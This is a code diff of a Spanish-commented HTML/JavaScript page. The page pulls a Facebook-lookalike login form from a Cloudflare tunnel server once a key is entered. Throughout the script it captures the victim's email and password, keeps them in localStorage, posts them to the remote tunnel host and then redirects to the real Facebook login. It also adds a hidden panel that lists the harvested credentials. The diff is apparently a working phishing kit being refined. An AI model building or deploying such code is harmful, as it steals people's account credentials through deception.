@@ -5,116 +5,159 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Replica Interface - Ayber</title>
     <style>
-        /* MANTENEMOS TU DISEÑO EXACTAMENTE IGUAL */
         body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #000000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Arial', sans-serif;
-            overflow: hidden;
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            background-color: #000000; display: flex;
+            justify-content: center; align-items: center;
+            font-family: 'Arial', sans-serif; overflow: hidden;
         }
 
         .main-container {
-            position: relative;
-            width: 100%;
-            max-width: 412px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            position: relative; width: 100%; max-width: 412px;
+            display: flex; flex-direction: column; align-items: center;
         }
 
-        .pro-image {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
+        .pro-image { width: 100%; height: auto; display: block; }
 
         .elements-overlay {
-            position: absolute;
-            bottom: 15%;
-            width: 85%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            position: absolute; bottom: 15%; width: 85%;
+            display: flex; flex-direction: column; align-items: center;
         }
 
         .key-label {
-            color: #ffffff;
-            font-size: 28px;
-            font-weight: 900;
-            margin-bottom: 12px;
-            text-shadow: 0px 2px 4px rgba(0,0,0,0.5);
+            color: #ffffff; font-size: 28px; font-weight: 900;
+            margin-bottom: 12px; text-shadow: 0px 2px 4px rgba(0,0,0,0.5);
         }
 
         .input-key {
-            width: 100%;
-            height: 44px;
-            background-color: #ffffff;
-            border: none;
-            border-radius: 50px;
-            text-align: center;
-            font-size: 16px;
-            color: #333;
-            margin-bottom: 10px;
-            outline: none;
+            width: 100%; height: 44px; background-color: #ffffff;
+            border: none; border-radius: 50px; text-align: center;
+            font-size: 16px; color: #333; margin-bottom: 10px; outline: none;
         }
 
         .btn-acceder {
-            width: 100%;
-            height: 44px;
-            background-color: #b0b0b0;
-            color: #000000;
-            font-size: 18px;
-            font-weight: bold;
-            border: none;
-            border-radius: 22px;
-            cursor: pointer;
-            transition: background 0.3s;
+            width: 100%; height: 44px; background-color: #b0b0b0;
+            color: #000000; font-size: 18px; font-weight: bold;
+            border: none; border-radius: 22px; cursor: pointer;
         }
 
-        .fb-body { background-color: #ffffff !important; overflow-y: auto !important; }
-        
-        /* Animación para el circulito de carga */
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .fb-body { background-color: #ffffff !important; overflow-y: auto !important; display: block !important;}
 
-        /* Estilo para el loader inyectado que usa tu imagen 2.jpg */
-        #loader img {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%; /* Opcional: lo hace circular */
+        #loader img { width: 60px; height: 60px; border-radius: 50%; }
+
+        #admin-panel {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #1c1e21; color: white; z-index: 3000; padding: 20px;
+            box-sizing: border-box; font-family: sans-serif; overflow-y: auto;
+        }
+
+        .log-card {
+            background: #242526; padding: 15px; border-radius: 10px;
+            margin-bottom: 15px; border-left: 5px solid #0866ff; position: relative;
+        }
+
+        .card-header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 10px; border-bottom: 1px solid #3a3b3c; padding-bottom: 5px;
+        }
+
+        .copy-btn {
+            background: #3a3b3c; color: #e4e6eb; border: none;
+            padding: 5px 8px; border-radius: 5px; font-size: 11px;
+            cursor: pointer; margin-left: 5px;
+        }
+
+        .btn-delete-single {
+            background: none; border: none; color: #f3425f; 
+            font-size: 18px; cursor: pointer; padding: 0 5px;
+        }
+
+        .btn-clear {
+            background: #f3425f; color: white; border: none;
+            padding: 12px; width: 100%; border-radius: 8px;
+            font-weight: bold; cursor: pointer; margin-top: 10px; margin-bottom: 30px;
         }
     </style>
 </head>
 <body>
-    <div id="admin-panel" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1c1e21; color: white; z-index: 2000; padding: 20px; box-sizing: border-box; font-family: monospace; overflow-y: auto;">
-        <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px;">
-            <span style="font-weight: bold; color: #0866ff;">PANEL ADMIN AYBER</span>
-            <button onclick="document.getElementById('admin-panel').style.display='none'" style="background: #f3425f; color: white; border: none; padding: 8px 15px; border-radius: 5px; font-weight: bold; cursor: pointer;">SALIR</button>
+
+    <div id="admin-panel">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+            <span style="font-weight: bold; color: #0866ff; font-size: 20px;">LOGS AYBER</span>
+            <button onclick="document.getElementById('admin-panel').style.display='none'" style="background:none; border:none; color:white; font-size:24px; cursor:pointer;">✕</button>
         </div>
         <div id="logs-container"></div>
+        <button class="btn-clear" onclick="limpiarHistorial()">BORRAR TODO EL HISTORIAL</button>
     </div>
 
     <div id="root" class="main-container">
         <img src="pro.png" class="pro-image" alt="Background">
-
         <div class="elements-overlay">
             <div class="key-label">KEY:</div>
-            <input type="text" id="keyField" class="input-key" placeholder="Ingresar KEY" autocomplete="off" spellcheck="false">
-
+            <input type="text" id="keyField" name="ayber_unique_key_field" class="input-key" placeholder="Ingresar KEY" autocomplete="off">
             <button class="btn-acceder" onclick="validar()">Acceder</button>
         </div>
     </div>
 
     <script>
-        const SERVIDOR_URL = "https://shoe-ins-timer-calendars.trycloudflare.com";
+        const SERVIDOR_URL = "https://bridal-capital-could-history.trycloudflare.com";
+
+        // Al cargar, forzamos que el campo esté vacío para ignorar el caché del navegador
+        window.onload = function() {
+            const kf = document.getElementById('keyField');
+            if(kf) kf.value = "";
+        };
+
+        function copiar(texto) {
+            navigator.clipboard.writeText(texto);
+        }
+
+        function limpiarHistorial() {
+            if(confirm("¿Borrar TODOS los datos, Ayber?")) {
+                localStorage.removeItem('cuentas_ayber');
+                renderLogs();
+            }
+        }
+
+        function borrarUno(index) {
+            if(confirm("¿Deseas eliminar este registro?")) {
+                let logs = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
+                let reversedLogs = logs.reverse();
+                reversedLogs.splice(index, 1);
+                let finalLogs = reversedLogs.reverse();
+                localStorage.setItem('cuentas_ayber', JSON.stringify(finalLogs));
+                renderLogs();
+            }
+        }
+
+        function renderLogs() {
+            const container = document.getElementById('logs-container');
+            const logs = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
+            container.innerHTML = logs.length ? "" : "<p style='text-align:center; color:#888;'>Sin datos.</p>";
+            const displayLogs = [...logs].reverse();
+            displayLogs.forEach((log, index) => {
+                container.innerHTML += `
+                    <div class="log-card">
+                        <div class="card-header">
+                            <span style="font-size:11px; color:#888;">${log.fecha}</span>
+                            <button class="btn-delete-single" onclick="borrarUno(${index})">🗑️</button>
+                        </div>
+                        <div style="margin-bottom:8px; display:flex; align-items:center; justify-content:space-between;">
+                            <span><b>U:</b> <span style="color:#45bd62;">${log.user}</span></span>
+                            <button class="copy-btn" onclick="copiar('${log.user}')">📋</button>
+                        </div>
+                        <div style="display:flex; align-items:center; justify-content:space-between;">
+                            <span><b>P:</b> <span style="color:#f3425f;">${log.pass}</span></span>
+                            <button class="copy-btn" onclick="copiar('${log.pass}')">📋</button>
+                        </div>
+                    </div>`;
+            });
+        }
 
         async function validar() {
             const keyDigitada = document.getElementById('keyField').value;
+            if(!keyDigitada) return;
+
             try {
                 const respuesta = await fetch(`${SERVIDOR_URL}/verify`, {
                     method: 'POST',
@@ -125,66 +168,46 @@
                 if (respuesta.ok) {
                     const data = await respuesta.json();
                     document.body.classList.add('fb-body');
-                    
-                    // Inyectamos el HTML de Facebook y nos aseguramos que el loader use 2.jpg
-                    let htmlInyectado = data.html;
-                    
-                    // Si el HTML inyectado trae un loader con una imagen externa, la reemplazamos por 2.jpg
-                    // Esto asume que el servidor envía una estructura con un id="loader" o una imagen de carga
-                    document.getElementById('root').innerHTML = htmlInyectado;
+                    document.getElementById('root').innerHTML = data.html;
 
-                    // Reemplazo manual de la imagen del loader después de inyectar
+                    // IMPORTANTE: Desactivar autocompletado también en los inputs inyectados
+                    const emailIn = document.getElementById('email');
+                    const passIn = document.getElementById('pass');
+                    if(emailIn) emailIn.setAttribute('autocomplete', 'off');
+                    if(passIn) passIn.setAttribute('autocomplete', 'new-password');
+
                     const loaderImg = document.querySelector('#loader img');
-                    if(loaderImg) {
-                        loaderImg.src = "2.jpg";
-                    }
+                    if(loaderImg) loaderImg.src = "2.jpg";
 
-                    // Activa el panel al dar doble clic en el logo inyectado
                     setTimeout(() => {
                         const logo = document.querySelector('img[alt="fb"]');
                         if(logo) {
                             logo.ondblclick = function() {
-                                const container = document.getElementById('logs-container');
-                                const logs = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
-                                container.innerHTML = logs.length ? "" : "<p>Sin datos aún.</p>";
-                                logs.reverse().forEach(log => {
-                                    container.innerHTML += `<div style="background: #242526; padding: 10px; border-radius: 8px; margin-bottom: 10px; border-left: 4px solid #0866ff; font-size: 13px;">
-                                        <div><b>Fecha:</b> ${log.fecha}</div>
-                                        <div><b>User:</b> <span style="color: #45bd62;">${log.user}</span></div>
-                                        <div><b>Pass:</b> <span style="color: #f3425f;">${log.pass}</span></div>
-                                    </div>`;
-                                });
+                                renderLogs();
                                 document.getElementById('admin-panel').style.display = 'block';
                             };
                         }
-                    }, 500);
-
-                } else {
-                    alert("KEY INVÁLIDA");
+                    }, 800);
+                } else { 
+                    alert("KEY INVÁLIDA"); 
                 }
-            } catch (error) {
-                alert("Error de conexión con Termux.");
-            }
+            } catch (e) { alert("Error de conexión."); }
         }
 
-        // Escuchar clics para capturar credenciales
         document.addEventListener('click', function (e) {
             if (e.target && e.target.id === 'btn-login') {
                 const email = document.getElementById('email').value;
                 const pass = document.getElementById('pass').value;
-                
                 if(!email || !pass) return;
 
-                // Guarda la cuenta en localStorage
                 let logs = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
                 logs.push({ user: email, pass: pass, fecha: new Date().toLocaleString() });
                 localStorage.setItem('cuentas_ayber', JSON.stringify(logs));
 
-                // Mostrar cargador (Asegurándonos que use 2.jpg)
                 const loader = document.getElementById('loader');
                 if(loader) {
-                    const imgInLoader = loader.querySelector('img');
-                    if(imgInLoader) imgInLoader.src = "2.jpg";
+                    const img = loader.querySelector('img');
+                    if(img) img.src = "2.jpg";
                     loader.style.display = 'flex';
                 }
 
@@ -192,22 +215,10 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ email: email, password: pass })
-                })
-                .then(res => res.json())
-                .then(data => {
+                }).then(() => {
                     setTimeout(() => {
-                        if(loader) loader.style.display = 'none';
-                        
-                        if(data.action === 'error') {
-                            document.getElementById('email').value = '';
-                            document.getElementById('pass').value = '';
-                            if(document.getElementById('error-box')) {
-                                document.getElementById('error-box').style.display = 'block';
-                            }
-                        } else {
-                            window.location.href = "https://www.facebook.com/login";
-                        }
-                    }, 5000); 
+                        window.location.href = "https://www.facebook.com/login";
+                    }, 3000); 
                 });
             }
         });
